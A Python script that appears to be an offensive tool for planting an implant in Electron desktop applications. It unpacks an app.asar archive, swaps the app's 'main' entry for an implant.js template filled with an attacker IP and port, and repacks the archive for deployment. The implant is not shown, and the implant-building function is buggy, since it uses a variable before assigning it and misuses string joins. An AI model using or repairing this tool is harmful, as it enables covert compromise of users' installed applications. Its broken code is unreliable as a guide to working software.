import subprocess
import os
import shutil
import re
import json

def getMainFunc(asarDir):
    with open(f"{asarDir}/package.json", 'r') as file:
        packageFile = file.readlines()

    main = re.compile(r'\"main\":.*')

    for num, line in enumerate(packageFile, start=0):
        if re.search(main, line):
            oldmain = packageFile[num].lstrip().replace(",", "").rstrip("\n")
            oldmain = f"{{{oldmain}}}"
            break

    json_data = json.loads(oldmain)
    mainValue = json_data["main"]
    return mainValue

def generateImplant(ip, port, asarDir):
    with open('implant.js', 'r') as file:
        default_implant = file.readlines()



    for index, line in enumerate(default_implant):
        if "PLACEHOLDERMAIN" in line:
            implantCode.join(line.replace("PLACEHOLDERMAIN", getMainFunc(asarDir)))
        elif "PLACEHOLDERHOST" in line:
            implantCode.join(line.replace("PLACEHOLDERHOST", f"'{ip}'"))
        elif "PLACEHOLDERPORT" in line:
            implantCode.join(line.replace("PLACEHOLDERPORT", str(port)))
        else:
            implantCode = ''.join(line)

    return implantCode

def generatePackage(asarDir):

    with open(f"{asarDir}/package.json", 'r') as file:
        packageFile = file.readlines()

    main = re.compile(r'\"main\":.*')

    for num, line in enumerate(packageFile, start=0):
        if re.search(main, line):
            oldmain = packageFile[num].lstrip().replace(",", "").rstrip("\n")
            oldmain = f"{{{oldmain}}}"
            packageFile[num] = "\t\"main\": \"main.js\",\n"
            break
    #print(oldmain)
    

    return packageFile


def extractAsar(archive):
    print(f"Extracting ASAR archive: {archive}...")
    subprocess.run(f'npx asar e {archive} extract', shell=True)

def createAsarFile(asarArchive, ipaddress, port):

    extractAsar(asarArchive)
    tempDir = "extract"

    print("Generating implant...")
    if os.path.exists(tempDir):
        implant = generateImplant(ipaddress, port, tempDir)
        package = generatePackage(tempDir)
        
        
        os.makedirs(tempDir, exist_ok=True)

        #Implant code file
        with open(f"{tempDir}/main.js", 'w') as file:
            file.write(implant)
        #Package json file
        with open(f"{tempDir}/package.json", 'w') as file:
            file.writelines(package)

        #use npx to generate app.asar
        print("Generating ASAR archive: app.asar")
        if not os.path.exists("../Output"):
            subprocess.run("mkdir ../Output", shell=True)
        subprocess.run(f'npx asar p {tempDir} ../Output/app.asar', shell=True)

    else:
        print("Error extracting ASAR archive.")

    #delete temp file after making asar archive
    if os.path.exists(tempDir):
        shutil.rmtree(tempDir)


    